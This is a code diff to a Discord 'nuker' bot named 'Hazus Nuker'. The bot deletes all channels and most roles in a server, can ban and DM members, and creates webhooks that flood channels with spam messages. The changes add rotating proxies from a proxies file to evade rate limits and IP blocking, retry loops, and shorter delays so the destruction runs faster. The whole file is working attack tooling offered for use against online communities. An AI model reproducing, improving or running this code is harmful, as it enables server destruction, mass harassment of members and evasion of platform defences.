@@ -3,7 +3,9 @@ import aiohttp
 import colorama
 import asyncio
 import configparser
+import random
 from modules import asynccprint, cprint
+from modules import get_proxies
 
 def bot_nuker():
     try:
@@ -11,12 +13,19 @@ def bot_nuker():
         intents.members = True
         intents.guilds = True
 
-        use_proxy = input(colorama.Fore.WHITE + "Use a proxy? (Y/N): ")
+        use_proxy = input(colorama.Fore.WHITE + "Use proxies? (Super slow unless you have good proxies) (Y/N): ")
         dm_members = input(colorama.Fore.WHITE + "Dm members? (Y/N) ")
         ban_members = input(colorama.Fore.WHITE + "Ban members? (Y/N) ")
         if use_proxy.strip().lower() == "y":
-            proxy = input("Input proxy (This should be a single, decent quality proxy for best results): ")
-            bot = Bot(intents=intents, proxy=f"http://{proxy}")
+            proxylist = get_proxies()
+            if not proxylist:
+                asynccprint("ERROR: NO PROXIES IN PROXIES.TXT", 1)
+            use_primary_proxy = input(colorama.Fore.WHITE + "Use primary proxy? (If no, most operations will be done through your normal ip instead of proxies while a few operations are done through proxies in proxies.txt, if yes most operations will be done through the primary proxy while a few operations are done through proxies in proxies.txt) (Y/N): ")
+            if use_primary_proxy.strip().lower() == 'y':
+                proxy = input("Input primary proxy (This should be a single, decent quality proxy for best results): ")
+                bot = Bot(intents=intents, proxy=f"http://{proxy}")
+            else:
+                bot = Bot(intents=intents)
         else:
             bot = Bot(intents=intents)
 
@@ -40,39 +49,55 @@ def bot_nuker():
                 await channel.delete()
                 await asynccprint(f"Deleted Channel {channel}", 0)
             except:
-                await asyncio.sleep(1)
+                await asyncio.sleep(0.3)
                 await delete_channel(channel)
         
         async def delete_role(role):
             try:
                 await role.delete()
                 await asynccprint(f"Deleted Role {role}", 0)
-            except:
-                await asyncio.sleep(1)
+            except Exception as e:
+                await asyncio.sleep(0.3)
+                print (e)
                 await delete_role(role)
 
-        async def spam_webhook(webhook):
+        async def spam_webhook(webhook, channel):
                 for _ in range(message_spam_times):
                     try:
-                        async with aiohttp.ClientSession() as session:
-                            async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4) as response:
-                                if 200 <= response.status <= 299:
-                                    await asynccprint(f"Sent message to webhook: {webhook}", 0)
-                                else:
-                                    await asynccprint(f"Webhook {webhook} is being rate limited.", 1)
+                        if use_proxy.strip().lower() == 'y':
+                            proxy = random.choice(proxylist)
+                            proxy = f'http://{proxy}'
+                            async with aiohttp.ClientSession() as session:
+                                async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4, proxy=proxy) as response:
+                                    if 200 <= response.status <= 299:
+                                        await asynccprint(f"Sent message in {channel}", 0)
+                                    else:
+                                        await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
+                        else:
+                            async with aiohttp.ClientSession() as session:
+                                async with session.post(webhook, json={"content": spam_message,"username": "Hazus Nuker"}, headers={"Content-Type": "application/json"}, timeout=4) as response:
+                                    if 200 <= response.status <= 299:
+                                        await asynccprint(f"Sent message in {channel}", 0)
+                                    else:
+                                        await asynccprint(f"Webhook in channel {channel} is being rate limited.", 2)
                     except Exception as e:
-                        print(f"Failed to send message: {e}")
-                        await asyncio.sleep(1)
+                        await asynccprint(f"Failed to send message in {channel}", 1)
+                        await asyncio.sleep(0.5)
 
         async def create_webhook(channelid):
-            try:
-                channel = await bot.fetch_channel(channelid)
-                webhook = await channel.create_webhook(name="Hazus Nuker")
-                await asynccprint(f"Created Webhook: {webhook.id}", 0)
-                await spam_webhook(webhook.url)
-            except:
-                await asyncio.sleep(1)
-                await create_webhook(channelid)
+            retries = 0
+            while True:
+                try:
+                    channel = await bot.fetch_channel(channelid)
+                    webhook = await channel.create_webhook(name="Hazus Nuker")
+                    await asynccprint(f"Created Webhook: {webhook.id}", 0)
+                    await spam_webhook(webhook.url, channelid)
+                    break
+                except:
+                    if retries > 3:
+                        break
+                    retries += 1
+                    await asyncio.sleep(1)
 
         async def create_channel(guild):
             try:
@@ -132,7 +157,7 @@ def bot_nuker():
 
             while True:
                 deletable_channels = [channel for channel in guild.channels]
-                deletable_roles = [role for role in guild.roles if role < guild.me.top_role and role != guild.default_role]
+                deletable_roles = [role for role in guild.roles if role.position < guild.me.top_role.position and role != guild.default_role]
 
                 if not deletable_channels and not deletable_roles:
                     await asynccprint("All deletable channels and roles have been successfully deleted.", 0)
@@ -161,7 +186,4 @@ def bot_nuker():
 
         bot.run(token)
     except Exception as e:
-        if use_proxy.strip().lower() == 'y':
-            cprint(f"Exception: {e}!\nThere was likely an issue with the proxy try with a different one!", 1)
-        else:
-            cprint(f"Exception: {e}!", 1)
+        cprint(f"{e}!", 1)
